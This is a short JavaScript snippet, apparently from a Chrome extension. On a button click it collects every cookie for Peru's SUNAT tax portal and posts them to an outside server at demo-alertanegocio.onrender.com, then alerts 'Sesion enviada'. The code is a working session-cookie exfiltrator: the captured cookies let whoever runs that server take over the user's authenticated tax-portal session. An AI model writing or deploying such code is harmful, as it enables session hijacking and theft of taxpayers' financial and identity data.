document.getElementById("send").onclick = async () => {

    const cookies = await chrome.cookies.getAll({
        domain: "sunat.gob.pe"
    })

    await fetch(
        "https://demo-alertanegocio.onrender.com/save-session",
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookies })
        }
    )

    alert("Sesion enviada")

}